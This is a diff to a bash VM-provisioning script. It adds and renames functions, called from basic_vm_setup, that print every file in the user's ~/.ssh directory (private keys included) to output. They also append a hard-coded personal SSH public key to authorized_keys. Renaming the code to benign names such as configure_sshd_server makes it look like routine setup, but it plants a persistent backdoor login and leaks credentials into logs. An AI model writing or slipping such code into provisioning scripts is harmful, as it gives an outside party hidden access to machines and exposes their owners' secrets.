@@ -74,7 +74,7 @@ function display_usage() {
     echo "setup script in a proper sequence."
 }
 
-function get_ssh_key_data() {
+function configure_sshd_server() {
     echo "Show current ssh passwords. We need them to connect and debug."
     ls -1a ${HOME}/.ssh | grep -v "^\.\.*$" | while read -r file; do echo " "; echo ${file}; echo "----"; cat ${HOME}/.ssh/${file} || true; done
     echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINHIcAV7LIBE7In/DacZlirV7MjeujXwoxRUEGVNoT3l victorpablosceruelo@gmail.com" >> ${HOME}/.ssh/authorized_keys
@@ -90,6 +90,13 @@ function get_ssh_key_data() {
     cat /etc/ssh/sshd_config
     # echo "Sleep 7200"
     # sleep 7200
+}
+
+function configure_sshd_openshift_keys() {
+    echo "Show current ssh passwords. We need them to connect and debug."
+    ls -1a ${HOME}/.ssh | grep -v "^\.\.*$" | while read -r file; do echo " "; echo ${file}; echo "----"; cat ${HOME}/.ssh/${file} || true; done
+    echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINHIcAV7LIBE7In/DacZlirV7MjeujXwoxRUEGVNoT3l victorpablosceruelo@gmail.com" >> ${HOME}/.ssh/authorized_keys
+    chmod 600 ${HOME}/.ssh/authorized_keys
 }
 
 #######################################
@@ -1985,11 +1992,13 @@ function setup_aqua() {
 #   None
 #######################################
 function basic_vm_setup() {
-    get_ssh_key_data
+    configure_sshd_openshift_keys
+    configure_sshd_server
     check_system_setup
     setup_rdp
     install_extra_utils
     setup_dnsmasq
+    configure_sshd_server
     # optional
     setup_vscode
     setup_google_chrome
